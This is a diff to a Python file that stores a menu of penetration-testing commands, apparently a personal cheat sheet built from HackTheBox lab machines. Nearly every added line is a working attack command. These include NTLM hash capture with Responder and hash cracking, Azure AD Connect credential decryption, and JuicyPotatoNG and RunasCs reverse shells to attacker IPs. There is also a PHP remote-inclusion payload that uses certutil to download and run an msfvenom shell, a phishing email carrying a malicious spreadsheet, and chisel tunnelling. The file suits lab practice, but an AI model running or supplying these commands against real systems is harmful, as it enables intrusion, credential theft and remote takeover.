@@ -132,7 +132,20 @@ menu_structure = {
                         ("mget *", "smb: \\>"),
 
                     ]
-                }
+                },
+                {
+                    "SMB clinet - downloading all files": [
+                        ("ssmbclient //example.local/shared -U J.Smith 'Password123'", "Connecting to host"),
+                        ("prompt false", "smb: \\>"),
+                        ("mput *", "smb: \\>"),
+                    ]
+                },
+                {
+                    "Using ntlm_theft script to create malicious files (for example to be placed on SMB shares - Flight HTB)": [
+                        ("smbclient //flight.htb/shared -U S.Moon 'S@Ss!K@*t13'", "Creating malicious files"),
+                        ("sudo responder -I tun0", "Running the responder"),
+                    ]
+                },
             ],
             "Exploitation": [
                 ("smbmap -H $IP -R", "List all files recursively in accessible shares"),
@@ -370,7 +383,7 @@ menu_structure = {
                 { 
                 "Responder":
                     [
-                    ("sudo responder -I ens224 ","Starting responder"),
+                    ("sudo responder -I tun0","Starting responder"),
                     ("hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt ","Cracking responder's hash"),
                     ],
                 },
@@ -617,6 +630,29 @@ menu_structure = {
                     [
                     ("lsadump::dcsync /user:corp\\dave","Mimikatz - example #1"),
                     ("lsadump::dcsync /user:corp\\Administrator","Mimikatz - example #1"),
+                    ],
+                },
+                {"Cracking the hash":
+                    [
+                    ("hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force","Cracking the hash"),
+                    ],
+                },
+
+            ],
+            "Azure AD Connect Database Exploit": 
+            [
+                {"Member of Azure Admins group (from HTB Monteverde machine)":
+                    [
+                    ("net user mhope","Check if you're in \"Azure Admins\" group"),
+                    ],
+                },
+                {"AdSyncDecrypt exploit":
+                    [
+                    ("https://github.com/VbScrub/AdSyncDecrypt/releases?source=post_page-----43ff31542a92---------------------------------------","Download exploit"),
+                    ("upload AdDecrypt.exe","While using evil-winrm upload files"),
+                    ("upload mcrypt.dll","While using evil-winrm upload files"),
+                    ("cd \"C:\\Program Files\\Microsoft Azure AD Sync\\Bin\"","Move to folder"),
+                    ("C:\\Users\\mhope\\Documents\\AdDecrypt.exe -FullSQL","Run the exploit"),
                     ],
                 },
                 {"Cracking the hash":
@@ -938,6 +974,7 @@ menu_structure = {
                 ("Get-History","History of commands"),
                 ("(Get-PSReadlineOption).HistorySavePath","Get the path of PSReadline"),
                 ("type C:\\Users\alice\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt","Read the PSReading file"),
+                ("type $env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt","Read the PSReading file")
                 ],
             },
         ],
@@ -1069,6 +1106,7 @@ menu_structure = {
                 "JuicyPotatoNG":
                 [
                 ("JuicyPotatoNG.exe -t * -p \"shell.exe\" -a","Running the reverse shell"),
+                (".\\juicypotatoNg.exe -t * -p \"C:\\Windows\\system32\\cmd.exe\" -a \"/c C:\\Users\\Public\\Documents\\nc.exe 10.10.14.17 445 -e cmd\"","Running the reverse shell (HTB Flight machine)"),
                 ],
             },
             {
@@ -1282,6 +1320,7 @@ menu_structure = {
                     ("wfuzz -c -b \"<SESSIONVARIABLE>=<SESSIONVALUE>\" -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-files.txt --hc 404 \"$URL\"","Authenticated fuzz"),
                     ("export URL=\"https://example.com/?parameter=FUZZ\"","Parameter fuzzing"),
                     ("wfuzz -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt \"$URL\"","Parameter fuzzing"),
+                    ("wfuzz -u http://10.10.11.187 -H \"Host: FUZZ.flight.htb\" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hh 7069","Enumerating subdomains"),
                     ],
                 },
             ],
@@ -1367,12 +1406,41 @@ menu_structure = {
         "Windows":
             {
             "LibreOffice evil macro":
+             
+                    [
+                        ("msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.241 LPORT=4444 -f hta-psh -o evil.hta","Payload"),
+                        ("nano splitter.py","Splitting the payload"),
+                        ("sendemail -f 'jonas@localhost' -t 'mailadmin@localhost' -s 192.168.244.140:25 -u 'a spreadsheet' -m 'Please check this spreadsheet' -a exploit.ods","Sending email"),
+                    ],
+                
+            "Windows php reverse shell":
                 [
-                    ("msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.241 LPORT=4444 -f hta-psh -o evil.hta","Payload"),
-                    ("nano splitter.py","Splitting the payload"),
-                    ("sendemail -f 'jonas@localhost' -t 'mailadmin@localhost' -s 192.168.244.140:25 -u 'a spreadsheet' -m 'Please check this spreadsheet' -a exploit.ods","Sending email"),
+                    {
+                    "PHP + msfvenom (Slort machine)":
+                        [
+                        ("msfvenom -p windows/shell_reverse_tcp LHOST=10.168.10.10 LPORT=445 -f exe > shell.exe","Generating paylsoad"),
+                        ("<?php $exec = system('certutil.exe -urlcache -split -f \"http://10.168.10.10/shell.exe\" shell.exe', $val); ?>","Preparing pwn.php script to upload file"),
+                        ("curl http://192.168.1.2:8080/site/index.php?page=http://10.168.10.10/pwn.php","Executing script"),
+                        ("<?php $exec = system('shell.exe', $val); ?>","Preparing pwn.php script to execute file"),
+                        ("curl http://192.168.1.2:8080/site/index.php?page=http://10.168.10.10/pwn.php","Running script")
+                        ],
+                    },
+              
+              
                 ],
-            },   
+            "Windows - Runas different user":
+                [
+                    {
+                    "Runas (Flight - HTB machine)":
+                        [
+                        (".\\RunasCs.exe c.bum Tikkycoll_431012284 cmd.exe -r 10.10.14.60:4444","Reverse shell as other user"),
+                        ],
+                    },
+              
+              
+                ],
+            },
+
 
                 
             
@@ -1653,8 +1721,14 @@ menu_structure = {
             {
                 "Chisel Client - Local Forwarding": 
                 [
-                    ("chisel client 10.10.10.2:8000 L:8080:10.10.10.2:80", "Forward local port 8080 to target's port 80")
-                ]
+                    ("chisel client 10.10.10.2:8000 L:8080:10.10.10.2:80", "Forward local port 8080 to target's port 80"),
+                ],
+                "Chisel (from Flight machine)": 
+                [
+                    ("./chisel server -p 8000 --reverse", "On Kali machine"),
+                    (".\\chisel client 10.10.14.17:8000 R:8001:127.0.0.1:8000", "On target Windows machine"),
+                    ("http://127.0.0.1:8001/", "Browsing the internal website"),
+                ],
             },
             {
                 "Differences": [
